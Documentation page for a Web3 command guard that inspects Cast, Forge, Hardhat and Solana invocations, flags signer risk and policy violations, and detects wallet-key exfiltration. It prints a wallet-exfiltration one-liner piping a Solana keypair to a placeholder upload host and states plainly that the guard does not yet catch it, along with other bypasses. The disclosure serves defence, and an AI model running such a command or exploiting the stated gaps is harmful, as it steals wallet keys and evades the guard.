# Web3 command guard

The Web3 command guard reads a Cast, Forge, Hardhat, Solana, or Anchor
invocation as a *grammar*, decides what it would DO, and compares that against a
trusted policy. It is a preflight control over the command you are about to run.

It is not chain analysis. Nothing here reads chain state, simulates a
transaction, resolves an ENS name, scores an address, inspects a contract, or
watches a mempool. An address is a string the guard deliberately keeps out of
its own output.

## What it decides

The parser lives in `crates/tirith-core/src/rules/web3/` and emits typed facts:
the tool family, the operation, the write mode, the signers with their roles,
the RPC reference, safety flags, destinations, and an explicit list of the gaps
it could not resolve. `crates/tirith-core/src/rules/web3_gate.rs` turns those
facts into findings.

Three Web3-specific rule IDs, with the shared `analysis_incomplete` rule for
configured analysis gaps:

| Rule | Fires when | Severity |
|---|---|---|
| `web3_state_changing_command` | the operation writes on-chain | Medium, or High when the same command also disables a declared safety control |
| `web3_signer_risk` | of the signer the command uses | Critical for literal raw key, keypair, or mnemonic material in argv; High for an unlocked node or an interactive prompt |
| `web3_network_policy_violation` | the operation contradicts the trusted `web3_guard` | High for a denied endpoint or an impermissible signer; the unclassified-endpoint case follows the policy's own action |

Bare private-key fragments stay out of the hot path because the credential and
exfiltration rules already cover them in their own contexts.

Parser gaps are retained. With a non-default `web3_guard`, the configured
`action_incomplete_analysis` decides how incomplete command or policy matching
is reported; a gap without command facts uses `analysis_incomplete`. The empty
default guard does not enable that policy action. `forge create` remains outside
the declared Forge grammar, so do not treat a default-policy allow as complete
coverage. `tirith task check` also reports incomplete inferred effects.

### The severity ladder, and why it stops where it does

A plain on-chain write is Medium. That is the tool doing its job. It rises to
High only when the same command ALSO switches off a check the operator declared:
`--skip-simulation`, `--skip-preflight`, or `--force`. That is the shape that
turns a mistake into an unrecoverable one.

Literal signer material in argv is Critical, because it is readable from the
process table, from shell history, and from any log that captured the command.
The key is compromised the moment it is typed, and no policy setting changes
that.

An operation explicitly aimed at `devnet`, `testnet`, `localhost`, `localnet`,
`local`, or a loopback endpoint produces **no** state-change finding. Deploying
to devnet is routine developer activity that happens many times a day, and a
control that interrupts it is a control operators learn to ignore. The signer
rules still apply: a raw key is exactly as exposed on devnet as on mainnet.

The match is an exact alias list, not a substring test, so `devnet` matches
while an attacker-supplied `my-devnet-proxy.example` does not.

## Evidence is categorical

A Web3 finding names the tool, the operation, and the signer KIND. It never
carries a key, a keystore path, a destination address, or the raw command:

```
tirith:v1:web3_operation;tool=cast;operation=send;write=state_changing;safety_bypass=no
tirith:v1:web3_signer;tool=cast;kind=raw_private_key;role=default
tirith:v1:web3_policy;tool=cast;status=denied_endpoint
```

Every field is a closed vocabulary token, mapped explicitly rather than derived
from Rust's `Debug` formatting, so renaming a variant cannot silently change
evidence that other tooling parses.

## Configuring `web3_guard`

The section lives in the policy file. Defaults are observational: no networks,
no signers, no denials, and every action at `warn`. **With no trusted networks
declared, the unclassified-endpoint path does not fire at all**, so an
unconfigured installation gets no `web3_network_policy_violation` from this
section.

That is a statement about this section only. The detection rules above are NOT
gated on configuration: on an unconfigured installation
`web3_state_changing_command` fires at Medium (action `warn`), and
`web3_signer_risk` fires at Critical (action `block`) for raw key or mnemonic
material in argv. Only `web3_network_policy_violation` needs configuration to
fire at all. See
[what changes on upgrade](../web3-task-rollout.md#what-is-on-by-default).

```yaml
# ~/.config/tirith/policy.yaml  (user scope) or the org policy root.
# A repository-scoped .tirith/policy.yaml CANNOT declare any of the
# grant-bearing keys below; see "A repository may tighten, never authorize".
web3_guard:
  networks:
    - name: ethereum-mainnet
      family: evm
      identity:
        evm_chain_id: 1        # or: solana_cluster + solana_genesis
      endpoints:
        - scheme: https
          host: eth-mainnet.example-rpc.invalid
          subdomains: exact_host
  allowed_signers: [hardware_wallet, keystore_file]
  deny_rpc:
    - scheme: https
      host: rpc.untrusted.invalid
      subdomains: host_and_subdomains
  action_unclassified_rpc: warn
  # Enforced constraints; see "Policy fields and current limits" below.
  deny_destinations: ["0x0000000000000000000000000000000000000000"]
  require_command_card: false
  action_incomplete_analysis: warn
  action_ambiguous_hardhat_production_run: warn
```

Field notes that matter more than the shape:

- **There is no free-form regex and no URL-string allowlist.** An endpoint is a
  structured matcher with a scheme, host, optional port, optional path prefix,
  and an explicit `subdomains` decision that defaults to `exact_host`. This is
  where endpoint policies usually fail: `https://rpc.example` as a *pattern*
  happily matches `https://rpc.example.attacker.tld`. Fixed fields cannot
  express that mistake.
- **Networks are keyed on real chain identity** (an EVM chain id, or a Solana
  cluster plus genesis hash), so a fork cannot pose as mainnet by reusing a
  name.
- **Raw and environment-bearing signer kinds are not expressible.**
  `allowed_signers` accepts only `hardware_wallet`, `keystore_file`,
  `keypair_file`, `account_alias`, and `unlocked_node`. A policy that could
  allowlist a raw private key would legitimize pasting a key into argv, which is
  the exact practice this guard detects. Those spellings are rejected rather
  than silently dropped, so you cannot believe you allowed something you did
  not.
- **`action_unclassified_rpc` is not a hostility verdict.** An endpoint no
  trusted network claims is reported with the words "this is not a claim that
  the host is malicious; it means the policy cannot vouch for it". If a
  legitimate endpoint is being reported, add it to the network's endpoints
  rather than suppressing the rule.

### Policy fields and current limits

The current engine consults these fields. Policy validation checks syntax and
bounds; it does not prove that an external tool or host is intercepted.

| Field | Current behavior |
|---|---|
| `deny_destinations` | Blocks a resolved denied destination on a state-changing command; unresolved destinations use the incomplete-analysis action |
| `require_command_card` | Blocks state-changing commands without an exactly bound, policy-authorized card; current executable/artifact qualification limits can make approval unavailable |
| `command_card_key_ids` | Restricts which verified signing key can satisfy Web3 approval |
| `selector_aliases` | Maps recognized tool/network selectors to trusted named networks; ambiguity remains incomplete |
| `action_incomplete_analysis` | Applies to incomplete parser and policy matching when the guard is configured |
| `action_ambiguous_hardhat_production_run` | Applies to arbitrary Hardhat scripts aimed at a resolved trusted non-development network |

These checks do not query chain state or certify a transaction. See the command
card limits below before enabling a required approval workflow.

### A repository may tighten, never authorize

A checked-in `.tirith/policy.yaml` is attacker-controlled in exactly the threat
model this guard exists for. So the repo merge is not a field-wise overwrite;
each field carries a direction:

| Field kind | Repo-scope behaviour |
|---|---|
| `networks`, `selector_aliases`, `allowed_signers`, `command_card_key_ids` | **RESET.** Their presence is authorization, so a repo value is dropped entirely. |
| `deny_rpc`, `deny_destinations` | **UNION.** More denial is strictly safer. |
| `action_*`, `require_command_card` | **STRICTER wins** on a total lattice. |

The engine evaluates the resulting constraints; repository values cannot
introduce trusted networks, signers or approval keys.

A property test proves the resulting effect set is always a subset of the
trusted one, across every provenance and trust combination, and that the merge
is idempotent.

`tirith policy effective` prints which repo keys were neutralized, so a
contributor who wrote a network into the repo policy can see that it was
dropped rather than wondering why it had no effect.

## Command cards for Web3 operations

`require_command_card` is an enforced requirement. The engine has a reachable
Web3 approval path that checks a verified card's signing key against trusted
policy and compares shell, network, chain/genesis, signer bindings, destinations,
policy identity and ordered operations. A signature alone does not authorize a
command, and a schema-1 card cannot approve a Web3 operation.

The requirement currently has strict availability limits. Unbound executable
identity or incomplete command facts refuse exact approval. Artifact-bearing
operations also refuse because the external tool cannot be held to the same
opened artifact at execution time. Requiring a card can therefore block a
workflow that the current implementation cannot approve; sudo does not supply
that missing execution binding. Do not advertise these checks as a generally
available transaction-approval service.

`tirith command-card create` and `sign` call the Web3 derivation path when
appropriate trusted keys are configured. They refuse these unsupported cases
with a categorical reason, rather than emitting an approval with weaker
bindings. New authoring uses schema 3: a command digest and shell identity
replace stored raw command text. Raw or interactive signer material is refused
before authoring. Signer references use nonsecret identity digests, and explicit
legacy signing migration does not bypass the binding requirements.

The declared comparison contract rejects raw signer material and legacy v1
Web3 approval, and requires ordered operation equality. These source-level
contracts and their tests are separate from native host/release qualification.

## Wallet material and exfiltration

The shared catalogue in `crates/tirith-core/src/sensitive_assets.rs` recognises
reviewed wallet paths, keystore documents, browser-wallet storage roots,
desktop-wallet files, Solana keypair arrays, BIP-39 mnemonics (with real
checksum arithmetic, not a word count), EVM private scalars, and hosted RPC
credentials, with target-explicit POSIX, macOS, and Windows path semantics.

Recognition feeds two things. First, **mandatory redaction**: a recognised
secret value, and separately a recognised private PATH, are removed from every
public and durable surface, including CLI evidence, the audit log,
`last_trigger.json`, SARIF, MCP responses, and the webhook payload. A path is
not a secret byte string, so value-based redaction cannot see it, which is why
the two are separate mechanisms.

Second, **source-to-sink correlation**. A proven read of a reviewed source
flowing to a proven remote sink is `data_exfiltration`. A source-only read is
not: `cat ~/.config/solana/id.json` on its own is an allow with zero findings,
because a security tool that fires on reading your own wallet file is a security
tool you turn off.

Staging is modelled across ordered same-command segments, including archive,
base64, hex, single-file compressor (`gzip -c`, `xz -c`, `zstd -c`), and
encryptor (`openssl enc -out`, `gpg -o`, `age -o`) hops, plus operand promotion
through `xargs`, `find -exec`, and GNU `parallel :::`. Provenance is invalidated
on a proven overwrite, truncate, or delete, and on branch or background
ambiguity.

**A known gap, stated rather than left to be found.** A producer inside a nested
shell body with the sink outside it escapes:

```
bash -c "cat ~/.config/solana/id.json" | curl --data-binary @- https://collector.invalid/upload
```

is a confident allow at this release. The nested body is analyzed, so the same
chain entirely inside `-c` blocks, and the same chain entirely outside `-c`
blocks; what is missing is propagation of the inner body's read provenance into
the outer pipeline. Related unprobed shapes are `xargs -a <file>`,
`parallel -a <file>`, and `while read` loops. See
[enforcement coverage](../enforcement-coverage.md) for the full ledger.

## What stops a command

Findings are a preflight decision. What turns a decision into a refusal is
separate, and narrower:

- an interactive shell hook in a blocking mode refuses to run the line;
- the MCP gateway refuses to forward the call;
- a tirith-owned transition (`pkg approve`, `pkg install`, `install`, `run`,
  `install url`, a tirith config write, the capsule preset) refuses before its
  own irreversible step.

A non-interactive shell, a direct `exec`, a program linking `tirith-core` as a
library, and an agent that never loaded the hook are not covered. `TIRITH=0`
bypasses unless `allow_bypass_env: false` is set, and a root user bypasses
trivially.

## See also

- [Enforcement coverage](../enforcement-coverage.md), the per-capability ledger
- [Task envelope](../task-envelope.md), the untrusted-task side of the boundary
- [Threat model](../threat-model.md), the non-goals this guard operates inside
- [Cookbook](../cookbook.md), worked `web3_guard` policy recipes
